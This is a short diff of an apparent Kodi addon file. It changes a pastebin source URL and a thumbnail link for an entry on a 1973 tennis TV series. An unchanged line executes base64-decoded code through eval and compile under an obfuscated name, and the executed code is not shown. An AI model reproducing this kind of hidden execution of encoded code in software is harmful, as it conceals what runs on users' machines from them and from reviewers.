@@ -214,7 +214,7 @@ from kodi_six import xbmc,xbmcgui,xbmcaddon,xbmcvfs
 from six.moves import urllib_request
 import six
 TRANSLATEPATH = xbmc.translatePath if six.PY2 else xbmcvfs.translatePath
-url = 'https://pastebin.com/raw/FE26YNrJ'
+url = 'https://pastebin.com/raw/UDA6LDhL'
 titulo = 'Raqueta de oro'
 import base64, codecs
 
@@ -289,7 +289,7 @@ eval(compile(base64.b64decode(eval('\x6e\x65\x6f')),'<string>','exec'))
 <page></page>
 </regex>
 <info>Serie de TV. (1973). 26 episodios. La serie cuenta la historia de Hiromi Oka (Marta en la versión española), una chica de secundaria quien lucha para convertirse en una buena tenista. Hiromi empieza a jugar tennis en su secundaria, porque ella está fascinada con una chica mayor, llamada Reika Ryuzaki, quien es la mejor jugadora en el equipo y es conocida como "Ochofujin", que significa "Madame Butterfly", dada su gracia en la cancha de tennis. El equipo tiene un nuevo coach, Jin Munakata, quien ve potencial en ella y la entrena para convertirla en una excelente jugadora de tennis. La fuerza sentimental de Hiromi para superar su debilidad mental es parte esencial de la historia y es descrita a detalle.</info>
-<thumbnail>https://www.themoviedb.org/t/p/original/fRIz0Hu3ulmHtbcPjZD0PQIYycD.jpg</thumbnail>
+<thumbnail>https://www.themoviedb.org/t/p/original/A71DkXs72VIcU7G8kX3jI8W46Sx.jpg</thumbnail>
 <fanart>https://i.imgur.com/yNfc6m7.jpg</fanart>
 </item>
 
